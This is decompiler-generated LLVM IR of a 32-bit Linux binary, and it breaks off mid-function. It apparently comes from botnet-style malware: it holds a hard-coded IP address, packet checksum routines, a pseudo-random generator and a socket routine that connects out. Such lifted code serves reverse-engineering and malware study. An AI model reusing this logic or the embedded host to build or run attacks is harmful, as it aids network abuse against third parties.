source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_8053930.2 = global i32 0
@global_var_8053948.3 = local_unnamed_addr global i32* @global_var_8053930.2
@global_var_80539f0.5 = local_unnamed_addr global i32 0
@global_var_80539fc.6 = local_unnamed_addr global i32 0
@global_var_80539f4.7 = local_unnamed_addr global i32 0
@global_var_80539f8.8 = local_unnamed_addr global i32 0
@global_var_8053a50.9 = local_unnamed_addr global i32 0
@global_var_8053a2a.10 = local_unnamed_addr global i32 0
@global_var_8053a30.11 = local_unnamed_addr global i32 0
@global_var_8053a20.12 = global i32 0
@global_var_8053a38.14 = local_unnamed_addr global i32 0
@global_var_8053a44.15 = local_unnamed_addr global i32 0
@global_var_8053a34.16 = global i32 0
@global_var_8053a9c.17 = local_unnamed_addr global i32 0
@global_var_8053a24.18 = local_unnamed_addr global i32 0
@global_var_8053a7c.19 = local_unnamed_addr global i32 0
@global_var_8053a2c.20 = local_unnamed_addr global i32 0
@global_var_8053a98.21 = local_unnamed_addr global i32 0
@global_var_8052219.22 = constant [3 x i8] c"\0D\0A\00"
@global_var_8053a00.24 = local_unnamed_addr global i32 0
@global_var_8053a48.25 = local_unnamed_addr global i32 0
@global_var_80521a2.26 = constant [15 x i8] c"80.211.158.133\00"
@global_var_8053ac0.27 = global i32 0
@global_var_8053a74.29 = global i32 0
@global_var_8053bc0.30 = global i32 0
@global_var_805395c.31 = global i32 0
@global_var_8053c6c.33 = global i32 0
@global_var_8053c70.34 = local_unnamed_addr global i32 0
@global_var_8053c74.35 = global i32 0
@global_var_8053c80.36 = local_unnamed_addr global i32 0
@global_var_8053f74.37 = global i32 0
@global_var_8053f9c.38 = local_unnamed_addr global i32 0
@global_var_8053f8c.39 = local_unnamed_addr global i32 0
@global_var_8053f90.40 = local_unnamed_addr global i32 0
@global_var_8053f94.41 = local_unnamed_addr global i32 0
@global_var_8053f98.42 = local_unnamed_addr global i32 0
@global_var_8053fa4.43 = local_unnamed_addr global i32 0
@global_var_8053fb0.44 = local_unnamed_addr global i32 0
@global_var_8053fa8.45 = local_unnamed_addr global i32 0
@global_var_8053fb4.46 = local_unnamed_addr global i32 0
@global_var_8053f88.47 = local_unnamed_addr global i32 0
@global_var_8053f84.49 = local_unnamed_addr global i32 0
@global_var_8053fac.50 = local_unnamed_addr global i32 0
@global_var_8053c7c.51 = local_unnamed_addr global i32 0
@global_var_8053974.52 = global i32 0
@global_var_805398c.54 = global i32 0
@global_var_8053a58.55 = local_unnamed_addr global i32 0
@global_var_8053924.57 = global i32 -1
@global_var_8051730.58 = constant i32 -294069
@global_var_8053a68.59 = local_unnamed_addr global i32 0
@global_var_8053a6c.60 = local_unnamed_addr global i32 0
@global_var_805260c.61 = constant [10 x i8] c"/dev/null\00"
@global_var_8053a64.63 = local_unnamed_addr global i32 0
@global_var_8053a5c.64 = local_unnamed_addr global i32 0
@global_var_8053a60.65 = local_unnamed_addr global i32 0
@global_var_8052720.67 = constant i32 33554944
@global_var_8051916.68 = constant i32 1928542531
@global_var_805193a.69 = constant i32 1928542531
@global_var_8053a78.70 = local_unnamed_addr global i32 0
@global_var_80539a8.71 = local_unnamed_addr global i32* @global_var_8052720.67
@global_var_8053fb8.72 = local_unnamed_addr global i32 0
@global_var_8053fbc.73 = local_unnamed_addr global i32 0
@global_var_80539c0.1 = local_unnamed_addr global i8 0
@global_var_8053a36.13 = local_unnamed_addr global i16 0
@global_var_8053a4c.23 = local_unnamed_addr global i16 0
@global_var_8053958.28 = local_unnamed_addr global i16 -1105
@global_var_8053c40.32 = global i8 0
@global_var_8053fa0.48 = local_unnamed_addr global i8 0
@global_var_8053a54.53 = local_unnamed_addr global i8 0
@global_var_8053a70.62 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 47259
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8052150()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80539c0.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053948.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053948.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053948.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80539c0.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053948.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80539c0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  store i32 0, i32* @eax, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134555936)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_80517cc(i32 134532096, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134553974, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v4_80481a19 = zext i8 %arg1 to i32
  %v2_80481a5 = icmp eq i8 %arg1, 0
  br i1 %v2_80481a5, label %dec_label_pc_80481d3, label %dec_label_pc_80481b0

dec_label_pc_80481b0:                             ; preds = %entry
  %v3_80481b4 = add i32 %v5_8048166, 4
  %v4_80481b4 = inttoptr i32 %v3_80481b4 to i8*
  %v5_80481b4 = load i8, i8* %v4_80481b4, align 4
  %v16_80481b4 = icmp eq i8 %v5_80481b4, -108
  br i1 %v16_80481b4, label %dec_label_pc_80481db, label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %dec_label_pc_80481b0
  br label %dec_label_pc_80481ce

dec_label_pc_80481c0:                             ; preds = %dec_label_pc_80481ce
  %v1_80481c0 = add i32 %v0_80481c3.in, 12
  %v2_80481c0 = inttoptr i32 %v1_80481c0 to i8*
  %v3_80481c0 = load i8, i8* %v2_80481c0, align 4
  %v4_80481c0 = zext i8 %v3_80481c0 to i32
  %v6_80481c0 = and i32 %v5_80481c0, -256
  %v7_80481c0 = or i32 %v4_80481c0, %v6_80481c0
  %v16_80481c8 = icmp eq i8 %v3_80481c0, -108
  br i1 %v16_80481c8, label %dec_label_pc_80481db, label %dec_label_pc_80481ce

dec_label_pc_80481ce:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b9
  %v5_80481c0 = phi i32 [ %v7_80481c0, %dec_label_pc_80481c0 ], [ 148, %dec_label_pc_80481b9 ]
  %v0_80481c3.in = phi i32 [ %v0_80481c3, %dec_label_pc_80481c0 ], [ %v5_8048166, %dec_label_pc_80481b9 ]
  %v0_80481ce = phi i32 [ %v1_80481ce, %dec_label_pc_80481c0 ], [ 0, %dec_label_pc_80481b9 ]
  %v0_80481c3 = add i32 %v0_80481c3.in, 8
  %v1_80481ce = add i32 %v0_80481ce, 1
  %v12_80481cf = icmp eq i32 %v1_80481ce, %v4_80481a19
  %v1_80481d1 = icmp eq i1 %v12_80481cf, false
  br i1 %v1_80481d1, label %dec_label_pc_80481c0, label %dec_label_pc_80481d3

dec_label_pc_80481d3:                             ; preds = %dec_label_pc_80481ce, %entry
  ret i32 134553974

dec_label_pc_80481db:                             ; preds = %dec_label_pc_80481c0, %dec_label_pc_80481b0
  %v0_80481db = phi i32 [ %v5_8048166, %dec_label_pc_80481b0 ], [ %v0_80481c3, %dec_label_pc_80481c0 ]
  %v1_80481db = inttoptr i32 %v0_80481db to i32*
  %v2_80481db = load i32, i32* %v1_80481db, align 4
  ret i32 %v2_80481db

; uselistorder directives
  uselistorder i32 %v0_80481c3.in, { 1, 0 }
  uselistorder i32 %v5_8048166, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
}

define i32 @function_804bd90() local_unnamed_addr {
dec_label_pc_804bd90:
  %tmp = call i16* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804bd97 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd90, %dec_label_pc_804bda0
  %v0_804bdae = phi i32 [ %v2_804bdae, %dec_label_pc_804bda0 ], [ 0, %dec_label_pc_804bd90 ]
  %v0_804bda3 = phi i32 [ %v1_804bda3, %dec_label_pc_804bda0 ], [ %tmp11, %dec_label_pc_804bd90 ]
  %v0_804bdab = phi i32 [ %v1_804bdab, %dec_label_pc_804bda0 ], [ %v4_804bd97, %dec_label_pc_804bd90 ]
  %v1_804bda0 = inttoptr i32 %v0_804bdab to i16*
  %v2_804bda0 = load i16, i16* %v1_804bda0, align 2
  %v3_804bda0 = zext i16 %v2_804bda0 to i32
  %v1_804bda3 = add i32 %v0_804bda3, -2
  %v1_804bdab = add i32 %v0_804bdab, 2
  %v2_804bdae = add i32 %v3_804bda0, %v0_804bdae
  %v5_804bdb0 = icmp eq i32 %v1_804bda3, 0
  %v9_804bdb0 = icmp eq i32 %v0_804bda3, 3
  %v2_804bdb3 = or i1 %v9_804bdb0, %v5_804bdb0
  br i1 %v2_804bdb3, label %dec_label_pc_804bdb5, label %dec_label_pc_804bda0

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bda0, %dec_label_pc_804bd90
  %v0_804bdbb = phi i32 [ 0, %dec_label_pc_804bd90 ], [ %v2_804bdae, %dec_label_pc_804bda0 ]
  %v0_804bdb8 = phi i32 [ %v4_804bd97, %dec_label_pc_804bd90 ], [ %v1_804bdab, %dec_label_pc_804bda0 ]
  %v0_804bdb5 = phi i32 [ %tmp11, %dec_label_pc_804bd90 ], [ %v1_804bda3, %dec_label_pc_804bda0 ]
  %v8_804bdb5 = icmp eq i32 %v0_804bdb5, 1
  %v1_804bdb6 = icmp eq i1 %v8_804bdb5, false
  br i1 %v1_804bdb6, label %dec_label_pc_804bdbd, label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bdb5
  %v1_804bdb8 = inttoptr i32 %v0_804bdb8 to i8*
  %v2_804bdb8 = load i8, i8* %v1_804bdb8, align 1
  %v3_804bdb8 = sext i8 %v2_804bdb8 to i32
  %v2_804bdbb = add i32 %v3_804bdb8, %v0_804bdbb
  br label %dec_label_pc_804bdbd

dec_label_pc_804bdbd:                             ; preds = %dec_label_pc_804bdb5, %dec_label_pc_804bdb8
  %v0_804bdbd = phi i32 [ %v0_804bdbb, %dec_label_pc_804bdb5 ], [ %v2_804bdbb, %dec_label_pc_804bdb8 ]
  %v1_804bdbf = urem i32 %v0_804bdbd, 65536
  %v2_804bdc2 = udiv i32 %v0_804bdbd, 65536
  %v2_804bdc6 = add nuw nsw i32 %v1_804bdbf, %v2_804bdc2
  %v2_804bdca = udiv i32 %v2_804bdc6, 65536
  %v2_804bdcd = add nuw nsw i32 %v2_804bdca, %v2_804bdc6
  %v1_804bdcf = urem i32 %v2_804bdcd, 65536
  %v1_804bdd2 = xor i32 %v1_804bdcf, 65535
  ret i32 %v1_804bdd2

; uselistorder directives
  uselistorder i32 %v2_804bdc6, { 1, 0 }
  uselistorder i32 %v0_804bdbb, { 1, 0 }
  uselistorder i32 %v1_804bda3, { 0, 2, 1 }
  uselistorder i32 %v4_804bd97, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdbd, { 1, 0 }
  uselistorder label %dec_label_pc_804bda0, { 1, 0 }
}

define i32 @function_804bde0() local_unnamed_addr {
dec_label_pc_804bde0:
  %tmp14 = call i16* @__decompiler_undefined_function_2()
  %tmp15 = call i16 @__decompiler_undefined_function_3()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804bdf5 = ptrtoint i16* %tmp14 to i32
  %v1_804bdfe = add i32 %tmp17, 12
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  %v3_804bdfe = load i32, i32* %v2_804bdfe, align 4
  %v1_804be01 = add i32 %tmp17, 16
  %v2_804be01 = inttoptr i32 %v1_804be01 to i32*
  %v3_804be01 = load i32, i32* %v2_804be01, align 4
  %v7_804be07 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804be07, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be10:                             ; preds = %dec_label_pc_804bde0, %dec_label_pc_804be10
  %v0_804be1e = phi i32 [ %v2_804be1e, %dec_label_pc_804be10 ], [ 0, %dec_label_pc_804bde0 ]
  %v0_804be13 = phi i32 [ %v1_804be13, %dec_label_pc_804be10 ], [ %tmp16, %dec_label_pc_804bde0 ]
  %v0_804be1b = phi i32 [ %v1_804be1b, %dec_label_pc_804be10 ], [ %v4_804bdf5, %dec_label_pc_804bde0 ]
  %v1_804be10 = inttoptr i32 %v0_804be1b to i16*
  %v2_804be10 = load i16, i16* %v1_804be10, align 2
  %v3_804be10 = zext i16 %v2_804be10 to i32
  %v1_804be13 = add i32 %v0_804be13, -2
  %v1_804be1b = add i32 %v0_804be1b, 2
  %v2_804be1e = add i32 %v3_804be10, %v0_804be1e
  %v1_804be20 = add i32 %v0_804be13, -3
  %v6_804be20 = sub i32 2, %v0_804be13
  %v7_804be20 = and i32 %v1_804be13, %v6_804be20
  %v8_804be20 = icmp slt i32 %v7_804be20, 0
  %v9_804be20 = icmp eq i32 %v1_804be20, 0
  %v10_804be20 = icmp slt i32 %v1_804be20, 0
  %v3_804be23 = icmp eq i1 %v10_804be20, %v8_804be20
  %v4_804be23 = icmp eq i1 %v9_804be20, false
  %v5_804be23 = and i1 %v4_804be23, %v3_804be23
  br i1 %v5_804be23, label %dec_label_pc_804be10, label %dec_label_pc_804be25

dec_label_pc_804be25:                             ; preds = %dec_label_pc_804be10, %dec_label_pc_804bde0
  %v0_804be90 = phi i32 [ 0, %dec_label_pc_804bde0 ], [ %v2_804be1e, %dec_label_pc_804be10 ]
  %v0_804be8e = phi i32 [ %v4_804bdf5, %dec_label_pc_804bde0 ], [ %v1_804be1b, %dec_label_pc_804be10 ]
  %v0_804be25 = phi i32 [ %tmp16, %dec_label_pc_804bde0 ], [ %v1_804be13, %dec_label_pc_804be10 ]
  %v8_804be25 = icmp eq i32 %v0_804be25, 1
  br i1 %v8_804be25, label %dec_label_pc_804be8c, label %dec_label_pc_804be28

dec_label_pc_804be28:                             ; preds = %dec_label_pc_804be25, %dec_label_pc_804be8c
  %v0_804be36 = phi i32 [ %v0_804be90, %dec_label_pc_804be25 ], [ %v2_804be90, %dec_label_pc_804be8c ]
  %v2_804be2c = udiv i32 %v3_804be01, 65536
  %v1_804be2f = add i32 %tmp17, 9
  %v2_804be2f = inttoptr i32 %v1_804be2f to i8*
  %v3_804be2f = load i8, i8* %v2_804be2f, align 1
  %v1_804be32 = zext i8 %v3_804be2f to i16
  %v2_804be32 = call i16 @llvm.bswap.i16(i16 %v1_804be32)
  %v3_804be32 = zext i16 %v2_804be32 to i32
  %v2_804be36 = add i32 %v0_804be36, %v2_804be2c
  %v2_804be3e = add i32 %v2_804be36, %v3_804be32
  %v1_804be44 = urem i32 %v3_804bdfe, 65536
  %v2_804be4a = udiv i32 %v3_804bdfe, 65536
  %v1_804be51 = urem i32 %v3_804be01, 65536
  %v4_804be59 = zext i16 %tmp15 to i32
  %v2_804be4d = add nuw nsw i32 %v2_804be4a, %v4_804be59
  %v2_804be57 = add nuw nsw i32 %v2_804be4d, %v1_804be44
  %v2_804be64 = add nuw nsw i32 %v2_804be57, %v1_804be51
  %v2_804be66 = add i32 %v2_804be64, %v2_804be3e
  %tmp = icmp ult i32 %v2_804be66, 65536
  br i1 %tmp, label %dec_label_pc_804be7e, label %dec_label_pc_804be70

dec_label_pc_804be70:                             ; preds = %dec_label_pc_804be28, %dec_label_pc_804be70
  %v2_804be753 = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794.in = phi i32 [ %v2_804be75, %dec_label_pc_804be70 ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v2_804be794 = udiv i32 %v2_804be794.in, 65536
  %v1_804be70 = urem i32 %v2_804be753, 65536
  %v2_804be75 = add nuw nsw i32 %v1_804be70, %v2_804be794
  %tmp25 = icmp ult i32 %v2_804be75, 65536
  %v1_804be7c = icmp eq i1 %tmp25, false
  br i1 %v1_804be7c, label %dec_label_pc_804be70, label %dec_label_pc_804be7e.loopexit

dec_label_pc_804be7e.loopexit:                    ; preds = %dec_label_pc_804be70
  br label %dec_label_pc_804be7e

dec_label_pc_804be7e:                             ; preds = %dec_label_pc_804be7e.loopexit, %dec_label_pc_804be28
  %v0_804be7e = phi i32 [ %v2_804be75, %dec_label_pc_804be7e.loopexit ], [ %v2_804be66, %dec_label_pc_804be28 ]
  %v1_804be7e = urem i32 %v0_804be7e, 65536
  %v1_804be82 = xor i32 %v1_804be7e, 65535
  ret i32 %v1_804be82

dec_label_pc_804be8c:                             ; preds = %dec_label_pc_804be25
  %v1_804be8e = inttoptr i32 %v0_804be8e to i8*
  %v2_804be8e = load i8, i8* %v1_804be8e, align 1
  %v3_804be8e = zext i8 %v2_804be8e to i32
  %v2_804be90 = add i32 %v3_804be8e, %v0_804be90
  br label %dec_label_pc_804be28

; uselistorder directives
  uselistorder i32 %v2_804be75, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804be66, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804be20, { 1, 0 }
  uselistorder i32 %v1_804be13, { 0, 2, 1 }
  uselistorder i32 %v3_804be01, { 1, 0 }
  uselistorder i32 %v4_804bdf5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804be70, { 1, 0 }
  uselistorder label %dec_label_pc_804be28, { 1, 0 }
  uselistorder label %dec_label_pc_804be10, { 1, 0 }
}

define i32 @function_804d350() local_unnamed_addr {
dec_label_pc_804d350:
  %v0_804d350 = load i32, i32* @global_var_80539f0.5, align 16
  %v0_804d358 = load i32, i32* @global_var_80539fc.6, align 4
  %v2_804d35e = mul i32 %v0_804d350, 2048
  %v2_804d363 = udiv i32 %v0_804d358, 524288
  store i32 %v2_804d363, i32* @ecx, align 4
  %v2_804d366 = xor i32 %v2_804d35e, %v0_804d350
  %v0_804d368 = load i32, i32* @global_var_80539f4.7, align 4
  store i32 %v0_804d368, i32* @global_var_80539f0.5, align 16
  %v0_804d372 = load i32, i32* @global_var_80539f8.8, align 8
  store i32 %v0_804d372, i32* @global_var_80539f4.7, align 4
  store i32 %v0_804d358, i32* @global_var_80539f8.8, align 8
  %v2_804d384 = xor i32 %v2_804d363, %v0_804d358
  %v2_804d386 = udiv i32 %v2_804d366, 256
  %v2_804d389 = xor i32 %v2_804d386, %v2_804d366
  %v2_804d38b = xor i32 %v2_804d389, %v2_804d384
  store i32 %v2_804d38b, i32* @global_var_80539fc.6, align 4
  ret i32 %v2_804d38b

; uselistorder directives
  uselistorder i32 %v2_804d366, { 1, 0 }
  uselistorder i32 %v2_804d363, { 1, 0 }
  uselistorder i32 %v0_804d358, { 1, 2, 0 }
  uselistorder i32 %v0_804d350, { 1, 0 }
}

define i32 @function_804d580() local_unnamed_addr {
dec_label_pc_804d580:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d580 = load i32, i32* @ebx, align 4
  %v0_804d581 = load i32, i32* @eax, align 4
  store i32 %v0_804d581, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d5a6 = add i32 %v0_804d581, 4
  %v2_804d5a6 = inttoptr i32 %v1_804d5a6 to i32*
  %v3_804d5a6 = load i32, i32* %v2_804d5a6, align 4
  %v10_804d5a9 = icmp eq i32 %v3_804d5a6, -1
  br i1 %v10_804d5a9, label %dec_label_pc_804d580.dec_label_pc_804d5ba_crit_edge, label %dec_label_pc_804d5ae

dec_label_pc_804d580.dec_label_pc_804d5ba_crit_edge: ; preds = %dec_label_pc_804d580
  br label %dec_label_pc_804d5ba

dec_label_pc_804d5ae:                             ; preds = %dec_label_pc_804d580
  %v1_804d5b2 = call i32 @function_804f8e3(i32 %v3_804d5a6)
  br label %dec_label_pc_804d5ba

dec_label_pc_804d5ba:                             ; preds = %dec_label_pc_804d580.dec_label_pc_804d5ba_crit_edge, %dec_label_pc_804d5ae
  %v0_804d5ba = phi i32 [ -1, %dec_label_pc_804d580.dec_label_pc_804d5ba_crit_edge ], [ %v1_804d5b2, %dec_label_pc_804d5ae ]
  store i32 %v0_804d5ba, i32* %stack_var_-32, align 4
  %v4_804d5c1 = call i32 @function_80500a4(i32 2, i32 1, i32 0, i32 %v0_804d5ba)
  %v1_804d5c9 = load i32, i32* @ebx, align 4
  %v2_804d5c9 = add i32 %v1_804d5c9, 4
  %v3_804d5c9 = inttoptr i32 %v2_804d5c9 to i32*
  store i32 %v4_804d5c1, i32* %v3_804d5c9, align 4
  %v1_804d5cc = add i32 %v4_804d5c1, 1
  %v8_804d5cc = icmp eq i32 %v1_804d5cc, 0
  br i1 %v8_804d5cc, label %dec_label_pc_804d643, label %dec_label_pc_804d5cf

dec_label_pc_804d5cf:                             ; preds = %dec_label_pc_804d5ba
  store i32 %v1_804d5cc, i32* %stack_var_-32, align 4
  %v0_804d5d1 = load i32, i32* @ebx, align 4
  %v1_804d5d1 = add i32 %v0_804d5d1, 28
  store i32 %v1_804d5d1, i32* @eax, align 4
  %v1_804d5d9 = add i32 %v0_804d5d1, 24
  %v2_804d5d9 = inttoptr i32 %v1_804d5d9 to i32*
  store i32 0, i32* %v2_804d5d9, align 4
  %v0_804d5e0 = load i32, i32* @eax, align 4
  %v3_804d5e1 = load i32, i32* %stack_var_-32, align 4
  %v4_804d5e1 = call i32 @function_804f450(i32 %v0_804d5e0, i32 256, i32 %v1_804d5cc, i32 %v3_804d5e1)
  %v0_804d5e9 = load i32, i32* @ebx, align 4
  %v1_804d5e9 = add i32 %v0_804d5e9, 4
  %v2_804d5e9 = inttoptr i32 %v1_804d5e9 to i32*
  %v3_804d5e9 = load i32, i32* %v2_804d5e9, align 4
  %v3_804d5f1 = call i32 @function_804f84d(i32 %v3_804d5e9, i32 3, i32 0)
  %v0_804d5f9 = load i32, i32* @ebx, align 4
  %v1_804d5f9 = add i32 %v0_804d5f9, 4
  %v2_804d5f9 = inttoptr i32 %v1_804d5f9 to i32*
  %v3_804d5f9 = load i32, i32* %v2_804d5f9, align 4
  %v12_804d5fc = or i32 %v3_804d5f1, 2048
  %v3_804d603 = call i32 @function_804f84d(i32 %v3_804d5f9, i32 4, i32 %v12_804d5fc)
  %v0_804d608 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804d61e = load i32, i32* @global_var_8053a50.9, align 16
  %v2_804d623 = add i32 %v0_804d608, 8
  %v3_804d623 = inttoptr i32 %v2_804d623 to i32*
  store i32 %v0_804d61e, i32* %v3_804d623, align 4
  %v2_804d626 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804d62d = load i32, i32* @ebx, align 4
  %v1_804d62d = add i32 %v0_804d62d, 4
  %v2_804d62d = inttoptr i32 %v1_804d62d to i32*
  %v3_804d62d = load i32, i32* %v2_804d62d, align 4
  store i32 %v3_804d62d, i32* %edx.global-to-local, align 4
  %v1_804d630 = add i32 %v0_804d62d, 12
  %v2_804d630 = inttoptr i32 %v1_804d630 to i32*
  store i32 1, i32* %v2_804d630, align 4
  %v0_804d63a = load i32, i32* %edx.global-to-local, align 4
  %v3_804d63b = call i32 @function_804feec(i32 %v0_804d63a, i32 %v2_804d626, i32 16)
  br label %dec_label_pc_804d643

dec_label_pc_804d643:                             ; preds = %dec_label_pc_804d5ba, %dec_label_pc_804d5cf
  %v0_804d647 = phi i32 [ %v3_804d63b, %dec_label_pc_804d5cf ], [ 0, %dec_label_pc_804d5ba ]
  store i32 %v0_804d580, i32* @ebx, align 4
  ret i32 %v0_804d647

; uselistorder directives
  uselistorder i32 %v3_804d5a6, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d643, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ba, { 1, 0 }
}

define i32 @function_804da6d() local_unnamed_addr {
dec_label_pc_804da6d:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804e052, %dec_label_pc_804da6d
  %v0_804da6d = load i32, i32* @global_var_8053a50.9, align 16
  store i32 %v0_804da6d, i32* @esi, align 4
  %v0_804da73 = load i32, i32* @esp, align 4
  %v1_804da73 = add i32 %v0_804da73, 16
